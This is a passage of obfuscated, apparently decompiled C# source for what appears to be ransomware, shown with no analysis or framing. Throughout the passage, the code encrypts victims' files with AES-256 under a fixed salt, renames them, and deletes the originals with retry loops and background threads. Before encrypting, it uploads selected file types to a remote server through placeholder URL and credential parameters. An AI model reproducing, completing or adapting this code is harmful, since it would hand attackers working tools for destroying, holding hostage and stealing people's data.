						UMuLPfDIPbk.mSMdqwRUXGu(NciqQhSWbfClU: (!zYwzjEDkZQtaV) ? (TiYWIzCfNH ? UMuLPfDIPbk.cbzUtQrNiJp(array3, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : UMuLPfDIPbk.cbzUtQrNiJp(array3, Encoding.ASCII.GetBytes(mUFfHMbfbMQl), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (TiYWIzCfNH ? CYEAiHugFcXLfMP.yrhlrOiGLQmYz(array3, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : CYEAiHugFcXLfMP.yrhlrOiGLQmYz(array3, Encoding.ASCII.GetBytes(mUFfHMbfbMQl), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), MmblxfahxxCq: fileInfo, DrFOiocWmftuTC: bytes);
					}
					else
					{
						string text2 = gQuYjEmPxqYv.VAHTkDGshMkF(32);
						string s2 = jEsaJdxjWqPyGCH.stchvRxTqLlLx(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (lMWKbzIoWOCjzA != ".*")
						{
							if (!HvyOqSUDzaouQicF)
							{
								if (!TiYWIzCfNH)
								{
									cPxOexmGvTaNs(fileInfo, fileInfo + lMWKbzIoWOCjzA, hUqYxvezKdhZvA);
								}
								else
								{
									cPxOexmGvTaNs(fileInfo, fileInfo + lMWKbzIoWOCjzA, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!TiYWIzCfNH)
									{
										nDXMFwKsrVToPZ(fileInfo, fileInfo + lMWKbzIoWOCjzA, hUqYxvezKdhZvA);
									}
									else
									{
										nDXMFwKsrVToPZ(fileInfo, fileInfo + lMWKbzIoWOCjzA, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (zHjohLaJRunF)
									{
										try
										{
											File.AppendAllText(AycWHRRkQAZMoSL, "File: " + fileInfo + " - Error while fully writing to file: " + ex6.Message + "\r\n");
										}
										catch (Exception)
										{
										}
									}
								}
							}
						}
						else if (!HvyOqSUDzaouQicF)
						{
							if (!TiYWIzCfNH)
							{
								cPxOexmGvTaNs(fileInfo, fileInfo + ".part", hUqYxvezKdhZvA);
							}
							else
							{
								cPxOexmGvTaNs(fileInfo, fileInfo + ".part", Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!TiYWIzCfNH)
								{
									nDXMFwKsrVToPZ(fileInfo, fileInfo, hUqYxvezKdhZvA);
								}
								else
								{
									nDXMFwKsrVToPZ(fileInfo, fileInfo, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (zHjohLaJRunF)
								{
									try
									{
										File.AppendAllText(AycWHRRkQAZMoSL, "File: " + fileInfo + " - Error while fully writing to file: " + ex8.Message + "\r\n");
									}
									catch (Exception)
									{
									}
								}
							}
						}
						if (TiYWIzCfNH)
						{
							if (lMWKbzIoWOCjzA != ".*")
							{
								QvrqrwsywdSEqe(fileInfo + lMWKbzIoWOCjzA, bytes2);
							}
							else
							{
								QvrqrwsywdSEqe(fileInfo, bytes2);
							}
						}
					}
					end_IL_010d_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0676;
			IL_0676:
			wonGhQdNYWV.Remove(fileInfo);
		});
	}

	private static void omlVqZFpCs(string FNSHnrnGna, string vzPJYiIVaDgHg, byte[] xbqlnDeQNiag)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(vzPJYiIVaDgHg, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(xbqlnDeQNiag, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(FNSHnrnGna, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (vzPJYiIVaDgHg.Length > 0)
				{
					FileStream fileStream3 = new FileStream(FNSHnrnGna, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (vyQhuqfsME == "YES")
					{
						foreach (string item in hDIFdHdmiGRW)
						{
							if (FNSHnrnGna.ToLower().EndsWith(item) && aQljRLcneiL == "YES")
							{
								if (Convert.ToInt32(DKFiWstOyiqUH) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										QtudfCYcVUfF.FFwygAkuXreOyx("URL", "USERNAME", "ACCESO", FNSHnrnGna);
									}
									catch
									{
									}
								}
							}
							else if (FNSHnrnGna.ToLower().EndsWith(item) && aQljRLcneiL == "NO")
							{
								try
								{
									QtudfCYcVUfF.FFwygAkuXreOyx("URL", "USERNAME", "ACCESO", FNSHnrnGna);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(FNSHnrnGna) && num2 >= 0)
							{
								File.Delete(FNSHnrnGna);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (vzPJYiIVaDgHg.EndsWith(".part"))
					{
						File.Move(vzPJYiIVaDgHg, vzPJYiIVaDgHg.Replace(".part", ""));
					}
					return;
				}
				try
				{
					File.Delete(vzPJYiIVaDgHg);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void nDXMFwKsrVToPZ(string cMhtvqIESHW, string ldDsAXZNTOZAzgP, byte[] BozFOmXBbTHnv)
	{
		if (vyQhuqfsME == "YES")
		{
			FileStream fileStream = new FileStream(cMhtvqIESHW, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			foreach (string item in hDIFdHdmiGRW)
			{
				if (cMhtvqIESHW.ToLower().EndsWith(item) && aQljRLcneiL == "YES")
				{
					if (Convert.ToInt32(DKFiWstOyiqUH) * 1024 * 1024 > fileStream.Length)
					{
						try
						{
							QtudfCYcVUfF.FFwygAkuXreOyx("URL", "USERNAME", "ACCESO", cMhtvqIESHW);
						}
						catch
						{
						}
					}
				}
				else if (cMhtvqIESHW.ToLower().EndsWith(item) && aQljRLcneiL == "NO")
				{
					try
					{
						QtudfCYcVUfF.FFwygAkuXreOyx("URL", "USERNAME", "ACCESO", cMhtvqIESHW);
					}
					catch
					{
					}
				}
			}
			fileStream.Dispose();
		}
		byte[] bytes = CYEAiHugFcXLfMP.yrhlrOiGLQmYz(File.ReadAllBytes(cMhtvqIESHW), BozFOmXBbTHnv, new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
		File.WriteAllBytes(cMhtvqIESHW, bytes);
		if (cMhtvqIESHW != ldDsAXZNTOZAzgP)
		{
			File.Move(cMhtvqIESHW, ldDsAXZNTOZAzgP);
		}
	}

	private static void cPxOexmGvTaNs(string xJaFdNPHVix, string eLyiwHLrknwgT, byte[] wrbfWNluJNPZxQTVA)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string path = eLyiwHLrknwgT;
			FileStream fileStream = new FileStream(path, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(wrbfWNluJNPZxQTVA, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (tdXPfZPVhETfyt == "YES")
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(xJaFdNPHVix, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(xJaFdNPHVix, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(xJaFdNPHVix, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (eLyiwHLrknwgT.Length > 0)
				{
					if (vyQhuqfsME == "YES")
					{
						FileStream fileStream4 = new FileStream(xJaFdNPHVix, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in hDIFdHdmiGRW)
						{
							if (xJaFdNPHVix.ToLower().EndsWith(item) && aQljRLcneiL == "YES")
							{
								if (Convert.ToInt32(DKFiWstOyiqUH) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										QtudfCYcVUfF.FFwygAkuXreOyx("URL", "USERNAME", "ACCESO", xJaFdNPHVix);
									}
									catch
									{
									}
								}
							}
							else if (xJaFdNPHVix.ToLower().EndsWith(item) && aQljRLcneiL == "NO")
							{
								try
								{
									QtudfCYcVUfF.FFwygAkuXreOyx("URL", "USERNAME", "ACCESO", xJaFdNPHVix);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(xJaFdNPHVix);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (eLyiwHLrknwgT.EndsWith(".part"))
					{
						File.Move(eLyiwHLrknwgT, eLyiwHLrknwgT.Replace(".part", ""));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(eLyiwHLrknwgT))
							{
								File.Delete(eLyiwHLrknwgT);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (zHjohLaJRunF)
			{
				try
				{
					File.AppendAllText(AycWHRRkQAZMoSL, "File: " + xJaFdNPHVix + " - Error while fully writing to file: " + ex2.Message + "\r\n");
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}
}
